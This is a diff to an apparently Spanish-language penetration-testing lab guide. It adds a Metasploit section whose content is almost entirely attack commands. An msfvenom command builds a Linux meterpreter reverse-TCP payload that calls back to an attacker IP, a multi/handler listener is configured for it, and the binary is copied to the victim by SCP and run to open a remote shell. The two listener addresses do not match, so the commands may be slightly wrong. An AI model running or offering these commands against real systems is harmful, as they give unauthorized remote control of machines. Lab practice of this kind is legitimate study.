@@ -834,7 +834,51 @@ atk6-alive6 ens33
 ```
 
   
-**4. Metasploit:**
+**3. Metasploit:**
+
+Desde el atacante:
+
+```
+msfconsole
+```
+
+```
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.207 lport=1234 -f elf -o origen_shell_1
+```
+
+```
+use exploit/multi/handler
+```
+
+```
+set payload linux/x64/meterpreter_reverse_tcp
+```
+
+```
+set lhost 10.11.48.203
+```
+
+```
+set lport 1234
+```
+
+```
+exploit
+```
+
+Una vez que estamos atacando desde la maquina que esta siendo atacada ejecutamos el shell (se lo pasamos a la mquina atacada mediante SCP y tenemos que darle los permisos necesarios)
+
+```
+./origen_shell_1
+```
+
+En este punto en la maquina que ataca se nos abrira un shell de la máquina que estamos atacando:
+
+```
+sysinfo
+
+```
+
 
 **5. Filtro ettercap:**
 
